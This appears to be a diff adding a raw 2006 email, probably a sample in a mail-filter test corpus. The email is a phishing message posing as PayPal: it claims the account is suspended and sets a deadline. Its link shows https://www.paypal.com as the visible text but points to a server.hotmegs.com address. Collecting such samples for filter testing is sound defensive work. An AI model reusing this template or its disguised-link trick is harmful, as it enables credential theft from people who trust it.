@@ -1,0 +1,73 @@
+From nobody Sun Jan 25 13:49:59 2015
+Return-Path: <service@intl.paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 291A846A7F;
+ Thu, 31 Aug 2006 12:53:10 -0400 (EDT)
+Received: from 72.54.29.14 (mail.csitechnologies.com [72.54.29.14])
+ by mail.example.org (Postfix) with SMTP id 0A4166FA4AC;
+ Thu, 31 Aug 2006 12:53:09 -0400 (EDT)
+Received: from 108.240.182.79 by ; Thu, 31 Aug 2006 14:46:51 -0300
+Message-ID: <YAETFBDLOKKJNBQDHNSBEPUF@earthlink.net>
+From: "PayPal" <service@intl.paypal.com>
+Reply-To: "PayPal" <service@intl.paypal.com>
+To: mo@example.com, libevent-users@example.com, nelson@example.com,
+ user@example.com, ceremony-bounces@example.com, laps@example.com,
+ vent-users@example.com, majordomo@example.com
+Subject: IMPORTANT : Notification Of Limited Account access
+Date: Thu, 31 Aug 2006 23:40:51 +0600
+X-Mailer: QUALCOMM Windows Eudora Version 5.1
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--793228313928583698"
+X-Priority: 1
+X-MSMail-Priority: High
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 169
+
+----793228313928583698
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<strong>Dear PayPal Member</strong>,<br>
+<br>During our regularly schedule account maintenance and verification we =
+have detected a slight error in your billing information on file with PayP=
+al.<br> This might be due to either following reasons:
+<br>
+<br>- A recent change in your personal information (i.e. change of address=
+)
+<br>- Submitting invalid information during the initial sign up process.
+<br>- An inability to accurately verify your selected option of payment du=
+e an internal error within
+our processors.
+<br>
+<br>Therefore your account has been temporarily suspended. We need you to =
+
+confirm your identity in
+order to regain full privileges of your account.<br><br>
+If this is not completed by <strong>September 3, 2006</strong>, we reserve=
+ 
+the right to terminate all privileges of your account
+indefinitly, as it may have been used for fraudulent purposes. We thank 
+you for your cooperation in this manner.<br>
+To confirm your identity please follow the link below:<br>
+<br>
+<a 
+href=3D"http://server.hotmegs.com/~pgrowers/%20/www.paypal.com/update/cgi-=
+bin/index.php?MfcISAPICommand=3DSignInFPP">https://www.paypal.com/cgi-bin/=
+webscr?cmd=3D_login-run</a>
+<br>
+<br>
+<br>
+Thank you for your patience in this matter.
+<br><br>
+PayPal - Customer Service
+<br><br>
+Please do not reply to this e-mail as this is only a notification. Mail 
+sent to this address cannot be answered.
+<br>
+
+----793228313928583698--
